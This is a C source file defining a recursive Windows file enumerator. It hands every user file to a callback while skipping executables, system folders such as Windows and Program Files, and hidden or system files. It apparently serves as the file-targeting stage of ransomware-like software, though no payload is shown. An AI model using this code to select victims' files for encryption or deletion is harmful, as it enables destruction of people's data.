/*
MIT License

Copyright (c) 2024 kadzicu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "SearchEngine.h"

_TCHAR* black_list_file_extension[] =
{
	_T(".exe"),
	_T(".dll"),
	_T(".sys"),
	_T(".lib"),
	_T(".obj"),
	_T(".exp"),
	_T(".def"),
	_T(".res"),
	_T(".pdb"),
	_T(".ilk"),
	_T(".msi"),
	_T(".lnk"),
	_T(".iobj"),
	_T(".ipdb"),
	_T(".netmodule"),
	_T(".searchconnector-ms")
};

_TCHAR* black_list_directories[] =
{
	_T("Windows"),
	_T("AppData"),
	_T("PerfLogs"),
	_T("ProgramData"),
	_T("Program Files"),
	_T("Program Files (x86)")
};

static bool find_in_array(_TCHAR** arr, INT size, _TCHAR* value)
{
	for (INT i = 0; i < size; i++)
		if (!lstrcmp(arr[i], value))
			return true;
	return false;
}

VOID search_engine(CONST _TCHAR* path, VOID(*fn)(_TCHAR* file))
{
	_TCHAR* param = NULL;
	if (!(param = (_TCHAR*)malloc(MAX_PATH_V2 * sizeof(_TCHAR))))
		ExitProcess(0);

	if (_tcscpy_s(param, MAX_PATH_V2, _T("\\\\?\\")))
		ExitProcess(0);
	if (_tcscat_s(param, MAX_PATH_V2, path))
		ExitProcess(0);
	if (_tcscat_s(param, MAX_PATH_V2, _T("\\*")))
		ExitProcess(0);

	WIN32_FIND_DATA FindFileData;
	ZeroMemory(&FindFileData, sizeof(FindFileData));

	HANDLE find = NULL;
	if ((find = FindFirstFile(param, &FindFileData)) == INVALID_HANDLE_VALUE)
		ExitProcess(0);

	do
	{
		if (!lstrcmp(FindFileData.cFileName, _T("."))) continue;
		if (!lstrcmp(FindFileData.cFileName, _T(".."))) continue;
		if (FindFileData.cFileName[0] == _T('.')) continue;

		_TCHAR* file = NULL;
		if (!(file = (_TCHAR*)malloc(MAX_PATH_V2 * sizeof(_TCHAR)))) 
			ExitProcess(0);

		if (_tcscpy_s(file, MAX_PATH_V2, path))
			ExitProcess(0);
		if (_tcscat_s(file, MAX_PATH_V2, _T("\\")))
			ExitProcess(0);
		if (_tcscat_s(file, MAX_PATH_V2, FindFileData.cFileName))
			ExitProcess(0);

		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
			!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
			!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			_TCHAR* file_ext = NULL;
			if (!(file_ext = PathFindExtension(file)))
				ExitProcess(0);

			INT black_list_size = _countof(black_list_file_extension);
			_TCHAR** black_list_ptr = black_list_file_extension;

			if (!find_in_array(black_list_ptr, black_list_size, file_ext))
				fn(file);
		}
		if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
			!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
			!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM))
		{
			if (_tcslen(file) < 23)
			{
				_TCHAR* dir_ptr = file + 3;
				INT black_list_size = _countof(black_list_directories);
				_TCHAR** black_list_ptr = black_list_directories;

				if (!find_in_array(black_list_ptr, black_list_size, dir_ptr))
					search_engine(file, fn);
			}
			else
				search_engine(file, fn);
		}
		free(file);

	} while (FindNextFile(find, &FindFileData));

	FindClose(find);
	free(param);
}